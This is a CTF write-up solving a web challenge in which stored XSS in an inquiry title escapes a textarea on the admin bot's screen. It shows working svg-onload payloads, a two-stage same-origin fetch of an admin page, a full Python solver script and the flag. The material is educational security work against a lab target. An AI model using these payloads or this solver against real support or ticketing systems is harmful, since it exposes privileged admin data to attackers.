---
title: "HyperSonic CTF 2026 enquiry Writeup"
description: "HyperSonic CTF 2026 enquiry writeup"
---

# enquiry

## Overview

`enquiry` is a web challenge where an inquiry submission service runs together with an admin bot. A regular user can register, log in, and create inquiries, and a separate bot request feature makes the admin review the inquiry.

The conditions I confirmed are as follows.

- Category: `web`
- Creating an inquiry submits a `title` and `content`.
- Viewing an inquiry's detail uses a UUID `id`.
- `/visit` takes an `id` and makes the admin bot open the inquiry and save a reply.
- Accessing `/admin`-style paths as a regular user returns `403`.

The goal is to get information that is only accessible with admin privileges saved as a reply to a user inquiry, then read the flag from that saved reply. The first thing to check is whether the inquiry content renders differently on the user screen and the admin bot screen.

## Challenge analysis

The terms used in this writeup:

- `app`: the service that handles registration, login, inquiry creation, and inquiry viewing.
- `bot`: the service that takes `/visit` requests and reviews inquiries with admin privileges.
- `id`: the UUID identifying an inquiry.
- `title`, `content`: the values a user supplies when creating an inquiry.
- `answer`: the reply input field in the admin reply form.
- User detail screen: the inquiry screen a regular user sees at `/inquiry/detail;id=...`.
- Admin screen: the screen the bot sees when it reviews the same inquiry with admin privileges.

A user goes through `/register` and `/login` and writes an inquiry at `/inquiry/new`. The `Location` of the inquiry creation response contains a UUID in the following form.

```text
/inquiry/detail;id=<uuid>
```

The bot request page takes an `id` and runs the admin bot.

```html
<form class="form-stack" method="post" action="/visit">
  <input name="id" class="mono" placeholder="00000000-0000-0000-0000-000000000000" required>
  <button class="primary-button" type="submit">요청</button>
</form>
```

If a valid UUID is sent, the bot reads the inquiry and saves a reply. Afterward, an automatic reply like the following appears in the reply area of the user detail screen.

```text
"<title>" 답변
안녕하세요. 문의 주신 내용 확인했습니다.
...
```

On the regular user screen, `title` and `content` are escaped as HTML entities. For example, even a script snippet is printed verbatim on the user detail screen.

```html
<h3>&#39;...payload...&#39;</h3>
<div class="inquiry-content preline">...</div>
```

So this is not a stored XSS that fires directly on the user screen. But the admin screen the bot sees has to be checked separately. The admin reply screen had a reply input field accessible via `document.all.answer`, and the `title` value landed in a `textarea` context.

I confirmed this with a short `title` payload.

```html
</textarea><svg/onload="a=document.all.answer;a.value=document.body.innerHTML;a.form.submit()">
```

When the bot ran against the inquiry with this payload, the admin screen's HTML was saved into the user reply. The user screen was escaped, but on the admin screen the `title` could close the `textarea` and open a new tag.

## Key idea

The attack uses the admin bot as a `same-origin` data exfiltration channel. There is no need to send an external callback or steal cookies. If we execute JavaScript on the admin screen, put the result in the `answer` field, and submit the form, a regular user can read that reply too.

The path that worked was to dump the admin screen's HTML once, find the admin screen's links, and read the `/admin/inquiry/guide` discovered there.

The full flow is as follows.

```text
Create a user inquiry
-> Escape the admin textarea from title
-> Execute JavaScript on the admin screen
-> Store the result in the answer field and submit
-> Read the saved reply on the user detail screen
```

Putting all of a long JavaScript payload into `title` is awkward, so `title` is used only as a short loader, and the longer second payload goes into `content`. When the first payload saves the admin screen's `body.innerText` as the reply, the second payload runs as the reply is rendered again on the admin screen.

## Solution

### Step 1. Confirm the inquiry and bot reply flow

First I created an inquiry with an ordinary user account and passed the generated UUID to `/visit`. When processed normally, the reply area of the user detail screen is no longer empty.

This step gave two pieces of information.

1. The bot opens inquiries with admin privileges and saves replies.
2. The reply can be read back by the original inquiry author.

So if I can read values from the admin bot's DOM and put them in `answer`, I can retrieve the result without any external communication.

### Step 2. Check whether the user screen escapes

I put HTML tags and event handlers in `title` and `content` and checked the user detail screen. On the user screen, the inquiry title goes inside `<h3>` and the inquiry content inside `div.inquiry-content`, but both are escaped as HTML entities.

```html
<h3>&quot;&gt;&lt;svg/onload=...&gt;</h3>
<div class="inquiry-content preline">&#39;&quot;&gt;&lt;/textarea&gt;...</div>
```

Script does not execute on the regular user screen. But since the bot opens the admin screen, the admin template has to be checked separately.

### Step 3. Escape the `title` textarea in the admin reply form

To check whether it executes on the admin screen, I put a short payload in `title`.

```html
</textarea><svg/onload="a=document.all.answer;a.value=document.body.innerHTML;a.form.submit()">
```

Three actions are needed here.

- Close the current textarea context with `</textarea>`.
- Execute JavaScript with `<svg/onload=...>`.
- Put the result in `document.all.answer` and submit the reply form.

After the bot ran, the admin screen's HTML was saved in the reply on the user detail screen. In that HTML I found `/admin/inquiry/guide` among the admin screen's links. The cookies and Web Storage had no meaningful values, so from there I proceeded by directly reading a `same-origin` page with admin privileges and saving it to the reply.

### Step 4. Read the admin guide page with a two-stage payload

To read the admin guide page, I split the work between `title` and `content`.

The first payload goes into `title`.

```html
</textarea><svg/onload=a=document.all.answer,a.form.submit(a.value=document.body.innerText)>
```

This code saves the admin screen's `body.innerText` into `answer`. At this point the second payload string placed in `content` is also included as text.

The second payload goes into `content`.

```html
</textarea><svg/onload="fetch('/admin/inquiry/guide').then(r=>r.text().then(t=>{a=document.all.answer;a.value='/admin/inquiry/guide '+r.status+' '+t.slice(0,5000);a.form.submit()}))">
```

After the first submit, when the admin screen is rendered again, the second payload that landed inside the reply textarea escapes with `</textarea>` again. It then fetches `/admin/inquiry/guide` with admin privileges, saves the response body into `answer`, and submits the form again.

This way, the admin guide page response ends up saved in the reply on the user detail screen.

## Exploit / Solver

The final solver works in the following order.

1. Create an arbitrary user account and log in.
2. Create an inquiry with a short loader in `title` and the second payload that fetches the admin guide page in `content`.
3. Pass the generated `id` to `/visit`.
4. Poll the user detail screen to find the flag pattern.

Below is the core routine. The connection address and session setup code are omitted; let `app` and `bot` be the base URLs of the inquiry service and the bot service, respectively.

```python
import re
import time

import requests


FLAG_RE = re.compile(r"HS\{[^}\r\n]+\}")

TITLE_STAGE = (
    "</textarea><svg/onload="
    "a=document.all.answer,"
    "a.form.submit(a.value=document.body.innerText)>"
)


def build_second_stage(path):
    js = (
        f"fetch('{path}').then(r=>r.text().then(t=>{{"
        "a=document.all.answer;"
        f"a.value='{path} '+r.status+' '+t.slice(0,5000);"
        "a.form.submit()"
        "}))"
    )
    return f'</textarea><svg/onload="{js}">'


def register_login(app):
    s = requests.Session()
    username = "u" + str(time.time_ns())
    password = "p" + str(time.time_ns())

    r = s.post(
        app + "/register",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=8,
    )
    assert r.status_code in (302, 303)

    r = s.post(
        app + "/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=8,
    )
    assert "/inquiry/new" in r.headers.get("Location", "")
    return s


def create_inquiry(app, session, title, content):
    r = session.post(
        app + "/inquiry/new",
        data={"title": title, "content": content},
        allow_redirects=False,
        timeout=8,
    )
    m = re.search(r"id=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    assert m is not None
    return m.group(1)


def solve(app, bot):
    session = register_login(app)

    guide_path = "/admin/inquiry/guide"
    inquiry_id = create_inquiry(
        app,
        session,
        TITLE_STAGE,
        build_second_stage(guide_path),
    )

    requests.post(bot + "/visit", data={"id": inquiry_id}, timeout=20)

    for _ in range(12):
        r = session.get(app + f"/inquiry/detail;id={inquiry_id}", timeout=8)
        m = FLAG_RE.search(r.text)
        if m:
            return m.group(0)
        time.sleep(2)

    raise RuntimeError("flag not found")
```

In this solver, `TITLE_STAGE` does not fetch any actual data. `TITLE_STAGE` only moves the second payload into the admin reply textarea. The actual admin page request is handled by the payload built in `build_second_stage()`.

## Result

After running the two-stage payload, the `/admin/inquiry/guide` response was saved in the user inquiry reply, and I found the flag in the guide page content.

```text
HS{b8b844df78d7f1a99c423d3d87d4e8231a7c64e6f5fec392b3e3ba13271652b8}
```
